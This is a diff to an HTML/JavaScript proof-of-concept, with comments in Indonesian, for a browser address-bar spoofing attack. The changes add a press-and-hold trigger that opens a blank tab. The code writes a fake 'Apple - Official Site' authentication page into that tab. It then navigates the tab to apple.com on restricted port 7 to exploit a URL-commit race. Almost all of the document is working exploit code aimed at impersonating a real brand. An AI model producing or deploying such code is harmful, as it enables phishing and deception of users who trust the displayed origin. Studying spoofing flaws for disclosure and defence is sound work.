@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Robust Origin Spoofing & Navigation Race PoC</title>
+    <title>Advanced Long-Press & Invalid Port Spoofing PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -16,7 +16,7 @@
         align-items: center;
         justify-content: center;
       }
-      .container { text-align: center; max-width: 600px; padding: 20px; }
+      .container { text-align: center; max-width: 650px; padding: 20px; }
       button {
         padding: 18px 36px;
         font-size: 16px;
@@ -27,6 +27,8 @@
         border-radius: 8px;
         cursor: pointer;
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
+        user-select: none;
+        -webkit-user-select: none;
         transition: transform 0.1s, background 0.2s;
       }
       button:active { background: #b62324; transform: scale(0.98); }
@@ -37,37 +39,108 @@
         font-family: monospace;
         word-break: break-all;
       }
+      .progress-bar {
+        width: 100%;
+        height: 4px;
+        background: #21262d;
+        border-radius: 2px;
+        margin-top: 15px;
+        overflow: hidden;
+        display: none;
+      }
+      .progress-fill {
+        width: 0%;
+        height: 100%;
+        background: #58a6ff;
+        transition: width 0.05s linear;
+      }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">INITIALIZE ADVANCED EXPLOIT CHAIN</button>
-      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
+      <!-- Tombol dengan interaksi tekan lama (Hold / Long-Press) -->
+      <button id="holdBtn">PRESS & HOLD TO INITIALIZE CHAIN</button>
+      <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+      <div class="info" id="statusInfo">Status: Ready. Press and hold the button for 1.5 seconds.</div>
     </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
-        const statusInfo = document.getElementById("statusInfo");
-        statusInfo.innerText = "Status: Opening isolated window context...";
-        this.style.display = "none";
+      const btn = document.getElementById("holdBtn");
+      const statusInfo = document.getElementById("statusInfo");
+      const progressBar = document.getElementById("progressBar");
+      const progressFill = document.getElementById("progressFill");
 
-        // Membuka jendela baru dengan referensi kosong
-        const targetWindow = window.open("about:blank", "_blank");
+      let holdTimer = null;
+      let progressInterval = null;
+      let startTime = null;
+      const HOLD_DURATION = 1500; // Durasi tekan dalam milidetik
 
-        if (!targetWindow) {
+      // Fungsi untuk memulai interaksi tekan
+      function startHold(e) {
+        e.preventDefault();
+        if (holdTimer) return;
+
+        statusInfo.innerText = "Status: Holding... Keep pressing to maintain preview state.";
+        progressBar.style.display = "block";
+        startTime = Date.now();
+
+        // Animasi progress bar interaksi
+        progressInterval = setInterval(() => {
+          const elapsed = Date.now() - startTime;
+          const percent = Math.min((elapsed / HOLD_DURATION) * 100, 100);
+          progressFill.style.width = percent + "%";
+        }, 30);
+
+        // Timer utama setelah durasi tekan tercapai
+        holdTimer = setTimeout(() => {
+          cleanupHold();
+          executeExploitChain();
+        }, HOLD_DURATION);
+      }
+
+      // Fungsi untuk membatalkan jika tombol dilepas sebelum waktunya
+      function cancelHold() {
+        if (!holdTimer) return;
+        clearTimeout(holdTimer);
+        cleanupHold();
+        statusInfo.innerText = "Status: Interaction cancelled (released too early).";
+      }
+
+      function cleanupHold() {
+        clearInterval(progressInterval);
+        holdTimer = null;
+        progressFill.style.width = "0%";
+        progressBar.style.display = "none";
+      }
+
+      // Event listener untuk mendukung perangkat sentuh maupun mouse desktop
+      btn.addEventListener("mousedown", startHold);
+      btn.addEventListener("mouseup", cancelHold);
+      btn.addEventListener("mouseleave", cancelHold);
+      
+      btn.addEventListener("touchstart", startHold);
+      btn.addEventListener("touchend", cancelHold);
+
+      function executeExploitChain() {
+        statusInfo.innerText = "Status: Opening target window context...";
+        btn.style.display = "none";
+
+        // Membuka jendela baru via about:blank
+        const newTab = window.open("about:blank", "_blank");
+
+        if (!newTab) {
           statusInfo.innerText = "Status: Failed - Popup blocked by browser policy.";
           return;
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting transitional payload...";
+          statusInfo.innerText = "Status: Injecting custom deceptive DOM payload...";
 
-          // Payload HTML tiruan untuk menguji ketahanan render awal
           const payloadHTML = `
             <!DOCTYPE html>
             <html>
             <head>
-              <title>Target Service Verification</title>
+              <title>Apple - Official Site</title>
               <style>
                 body {
                   margin: 0; background: #ffffff; color: #1d1d1f;
@@ -82,64 +155,35 @@
             </head>
             <body>
               <div class="box">
-                <h1>SECURITY CONTEXT TEST</h1>
-                <p>Evaluating state transition & address bar stability.</p>
+                <h1>AUTHENTICATION GATEWAY</h1>
+                <p>Verifying secure session transition...</p>
               </div>
-              <script>
-                // Mengirim sinyal balik ke opener setelah DOM siap untuk mengurangi ketergantungan pada timeout statis
-                window.addEventListener('DOMContentLoaded', () => {
-                  if (window.opener) {
-                    window.opener.postMessage({ status: 'DOM_READY' }, '*');
-                  }
-                });
-              <\/script>
             </body>
             </html>
           `;
 
-          // Menulis payload langsung ke dokumen target
-          targetWindow.document.open();
-          targetWindow.document.write(payloadHTML);
-          targetWindow.document.close();
+          newTab.document.open();
+          newTab.document.write(payloadHTML);
+          newTab.document.close();
 
-          statusInfo.innerText = "Status: Waiting for DOM readiness signal...";
+          statusInfo.innerText = "Status: DOM injected. Forcing navigation via invalid restricted port...";
 
-          // Listener untuk menerima konfirmasi dari jendela anak
-          const messageHandler = (event) => {
-            if (event.data && event.data.status === 'DOM_READY') {
-              window.removeEventListener('message', messageHandler);
-              statusInfo.innerText = "Status: DOM ready received. Triggering target navigation race...";
-
-              // Jeda mikro untuk menguji celah transisi commit origin
-              setTimeout(() => {
-                try {
-                  // Mengarahkan ke URL eksternal yang diuji ketahanannya
-                  targetWindow.location.href = "https://example.com";
-                  statusInfo.innerText = "Status: Navigation sequence completed successfully.";
-                } catch (navErr) {
-                  statusInfo.innerText = "Status: Navigation blocked: " + navErr.message;
-                }
-              }, 400); // Waktu tunda yang lebih ketat dibanding versi sebelumnya
-            }
-          };
-
-          window.addEventListener('message', messageHandler);
-
-          // Fallback timer jika sinyal postMessage gagal diterima dalam waktu tertentu
+          // Kombinasi Invalid / Restricted Port untuk memaksa penundaan/kegagalan commit URL (Race Condition)
+          // Port seperti 7 (ECHO) atau 1 (MUX) secara historis diblokir atau memicu ERR_UNSAFE_PORT
           setTimeout(() => {
-            window.removeEventListener('message', messageHandler);
             try {
-              targetWindow.location.href = "https://example.com";
-              statusInfo.innerText = "Status: Fallback navigation triggered.";
-            } catch (err) {
-              console.debug("Fallback restricted:", err.message);
+              // Mengarahkan ke port terlarang/tidak valid pada domain target untuk menguji penanganan error/commit race
+              newTab.location.href = "https://apple.com:7/spoof-test";
+              statusInfo.innerText = "Status: Invalid port navigation dispatched.";
+            } catch (navErr) {
+              statusInfo.innerText = "Status: Navigation caught by policy: " + navErr.message;
             }
-          }, 1500);
+          }, 600);
 
         } catch (e) {
           statusInfo.innerText = "Status: Execution error - " + e.message;
         }
-      };
+      }
     </script>
   </body>
 </html>
